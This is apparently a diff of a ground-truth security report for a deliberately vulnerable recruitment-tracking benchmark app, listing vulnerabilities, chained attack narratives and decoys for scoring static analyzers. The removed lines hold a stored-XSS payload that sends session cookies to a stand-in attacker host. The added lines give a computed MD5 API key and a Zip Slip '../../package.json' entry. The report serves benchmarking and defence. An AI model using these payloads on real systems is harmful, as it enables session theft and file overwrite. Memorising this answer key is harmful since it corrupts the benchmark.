@@ -1,117 +1,112 @@
-# Security Report: app-33-recruitment-ats
+# Security Report: app-33 — Recruitment ATS Platform
 
-## Application Information
-
-- **App ID**: app-33
-- **App Name**: Recruitment Applicant Tracking System
-- **Language**: TypeScript
-- **Framework**: Express
-- **Source**: `apps/typescript/app-33-recruitment-ats/`
+**Language:** Typescript (Express)
+**Directory:** `apps/typescript/app-33-recruitment-ats`
 
 ---
+
+## Application Information
+- **App ID:** app-33
+- **Name:** Recruitment ATS Platform
+- **Language:** Typescript
+- **Framework:** Express
 
 ## Vulnerability Summary
 
+The following vulnerability list represents the ground truth security issues identified for this application:
+
 | ID | OWASP | Category | Severity | Location | CWE |
 |---|---|---|---|---|---|
-| V1 | A01 | Broken Access Control | Medium | `src/index.ts` → `GET /api/applications/:id` (lines 156-170) | CWE-639 |
-| V2 | A03 | Injection | High | `src/index.ts` → `POST /api/positions` (lines 148-155) | CWE-79 |
-| V3 | A09 | Security Logging and Monitoring Failures | Low | `src/index.ts` → `DELETE /api/admin/applications/:id` (lines 193-207) | CWE-778 |
-
-### V1: IDOR on Job Applications
-
-**OWASP Category**: A01 — Broken Access Control
-
-**Description**: Viewing job application details by ID lacks verification of user ownership, allowing any authenticated user to retrieve another applicant's application.
-
-**Endpoint**: `GET /api/applications/:id`
-
-**CWE**: CWE-639 (Authorization Bypass Through User-Controlled Key)
-
-**Impact**: Medium — Any authenticated user can enumerate application IDs to view sensitive resume data, cover letters, and evaluation notes.
-
-**Detection**: Look for absence of ownership checks where the `:id` parameter is used without verifying `req.user.id` against the application's applicant ID.
+| V1 | A01 | Broken Access Control | Medium | src/index.ts | CWE-639 |
+| V2 | A02 | Cryptographic Failures | Medium | src/index.ts | CWE-328 |
+| V3 | A06 | Vulnerable and Outdated Components | High | src/index.ts | CWE-22 |
 
 ---
 
-### V2: Stored XSS in Position Descriptions
+## Standalone Vulnerabilities
 
-**OWASP Category**: A03 — Injection
+### VULN-01: A01 — Broken Access Control
 
-**Description**: Job position descriptions created by recruiters are stored and rendered without HTML encoding, enabling stored cross-site scripting.
+- **Severity:** Medium
+- **Location:** `src/index.ts`:180-192 (method: `GET /api/applications/:id`)
+- **CWE:** [CWE-639](https://cwe.mitre.org/data/definitions/639.html)
 
-**Endpoint**: `POST /api/positions`
+#### Description
+Retrieving a job application by ID lacks ownership or role checks, allowing any authenticated user to view other candidates' application details.
 
-**CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation)
+### VULN-02: A02 — Cryptographic Failures
 
-**Impact**: High — An attacker/insider can inject malicious JavaScript in a position description. When applicants or other recruiters view the position, the script executes in their browser.
+- **Severity:** Medium
+- **Location:** `src/index.ts`:172-177 (method: `POST /api/auth/api-key`)
+- **CWE:** [CWE-328](https://cwe.mitre.org/data/definitions/328.html)
 
-**Detection**: Look for position description fields being stored as raw HTML and served without sanitization.
+#### Description
+Developer API tokens are generated using the insecure MD5 hashing algorithm on the user's sequential integer ID, making the keys highly predictable.
+
+### VULN-03: A06 — Vulnerable and Outdated Components
+
+- **Severity:** High
+- **Location:** `src/index.ts`:195-238 (method: `POST /api/applications/upload-portfolio`)
+- **CWE:** [CWE-22](https://cwe.mitre.org/data/definitions/22.html)
+
+#### Description
+The zip file upload handler extracts contents directly using relative file entry names without checking for directory traversal, exposing the system to Zip Slip path traversal file overwrite.
+
 
 ---
 
-### V3: Missing Audit Log on Application Deletion
+## Chained Attack Scenarios
 
-**OWASP Category**: A09 — Security Logging and Monitoring Failures
+Chained scenarios represent multiple code-level weaknesses that, when exploited in sequence, lead to high-impact outcomes.
 
-**Description**: Deleting job applications at the admin level produces no audit logs, leaving record destruction untracked.
+### CHAIN-01: Predictable API Key Derivation → Zip Slip Arbitrary File Write
 
-**Endpoint**: `DELETE /api/admin/applications/:id`
+- **Combined Impact:** `data_modification`
+- **Difficulty:** Hard
+- **Subtlety Tags:** `cross_file` `stateful_flow` `implicit_trust` `realistic_decoy`
 
-**CWE**: CWE-778 (Insufficient Logging)
+#### Prerequisites
+- attacker has or can create a low privilege account
+- attacker can combine request input with stored application state
 
-**Impact**: Low — Malicious deletion of candidate applications cannot be traced or investigated.
+#### Attack Narrative
+An attacker targets a recruiter account (user ID 3) and computes their MD5-based API key: md5('3') = 'eccbc87e4b5ce2fe28308fd9f2a7baf3'. Authenticating with this admin key, they call the `/api/applications/upload-portfolio` endpoint and upload a ZIP archive containing a file entry named `../../package.json` to overwrite the application root files.
 
-**Detection**: Check the delete handler for any logging, audit trail, or notification mechanism before/after performing the deletion operation.
+#### Chain Components
+| Step | Description | Severity | OWASP | CWE | Location | Method |
+|---|---|---|---|---|---|---|
+| 1 | User API tokens are derived predictably from the user ID via MD5. | Medium | A02 | CWE-328 | src/index.ts | `POST /api/auth/api-key` |
+| 2 | Admin endpoint extracts ZIP archives without validating target paths, enabling file overwrite. | Medium | A06 | CWE-22 | src/index.ts | `POST /api/applications/upload-portfolio` |
 
----
+### CHAIN-02: Subtle Path Traversal Pivot To Idor
 
-## Chained Attack Scenario
+- **Combined Impact:** `data_modification`
+- **Difficulty:** Hard
+- **Subtlety Tags:** `cross_file` `stateful_flow` `implicit_trust` `realistic_decoy` `secondary_chain`
 
-### Chain: "Stored XSS Position Hijack → IDOR Application Exfiltration"
+#### Prerequisites
+- attacker has or can create a low privilege account
+- attacker can combine request input with stored application state
 
-**Impact**: `db_exfiltration`
+#### Attack Narrative
+Attacker combines a low-visibility entry point with stored or derived application state, then pivots to a higher-impact sink that is reachable only after following the cross-file flow.
 
-**Overview**: A malicious insider creates a position with malicious JavaScript that steals a recruiter's session, then uses that session to exfiltrate all job applications via IDOR.
+#### Chain Components
+| Step | Description | Severity | OWASP | CWE | Location | Method |
+|---|---|---|---|---|---|---|
+| 1 | The zip file upload handler extracts contents directly using relative file entry names without checking for directory traversal, exposing the system to Zip Slip path traversal file overwrite. | High | A06 | CWE-22 | src/index.ts | `POST /api/applications/upload-portfolio` |
+| 2 | Developer API tokens are generated using the insecure MD5 hashing algorithm on the user's sequential integer ID, making the keys highly predictable. | Medium | A02 | CWE-328 | src/index.ts | `POST /api/auth/api-key` |
+| 3 | Retrieving a job application by ID lacks ownership or role checks, allowing any authenticated user to view other candidates' application details. | Medium | A01 | CWE-639 | src/index.ts | `GET /api/applications/:id` |
 
-**Components**:
-
-| Step | Issue | Severity | OWASP | CWE | Location |
-|---|---|---|---|---|---|
-| 1 | Stored XSS in position descriptions enables session cookie theft | Medium | A03 | CWE-79 | `POST /api/positions` |
-| 2 | Application detail endpoint permits IDOR exfiltration of candidate data | Medium | A01 | CWE-639 | `GET /api/applications/:id` |
-
-**Attack Narrative**:
-1. A malicious insider creates a job position with a description containing `<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>`.
-2. When a recruiter views the position listings, the XSS payload executes in their browser, exfiltrating their session cookie.
-3. Using the hijacked session, the attacker queries `GET /api/applications/3` through IDOR to view candidate applications containing PII, resumes, and evaluation scores.
-
-**Combined Impact**: Database exfiltration — An attacker can steal recruiter sessions and exfiltrate candidate application data by chaining stored XSS with IDOR.
 
 ---
 
 ## Decoys (False-Positive Candidates)
 
+These code patterns mimic security weaknesses but are safe. They are included to measure static analyzer precision:
+
 | Location | Description |
 |---|---|
-| `src/index.ts` | Proper user scoping in `GET /api/applications` limiting results to own applications only |
-| `src/index.ts` | Proper parameterized query logic in `POST /api/applications` to submit applications safely |
-
----
-
-## Detection Commands
-
-```bash
-# Find IDOR on application details
-grep -n "applications.*:id\|findOne\|findById" apps/typescript/app-33-recruitment-ats/src/index.ts
-
-# Find XSS in position creation
-grep -n "description\|position\|<script\|innerHTML" apps/typescript/app-33-recruitment-ats/src/index.ts
-
-# Find missing audit logs on deletion
-grep -n "delete\|remove\|log\|audit" apps/typescript/app-33-recruitment-ats/src/index.ts
-```
-
----
-
-*Report generated from `.vulns` manifest for app-33-recruitment-ats*
+| src/index.ts | Proper Bcrypt hashing for password storage and credentials verification during login. |
+| src/index.ts | Proper application access control limits in GET /api/recruiter/dashboard checking for RECRUITER role. |
+| src/index.ts | Proper ownership filtering in GET /api/applications/my ensuring candidates only read their own applications. |
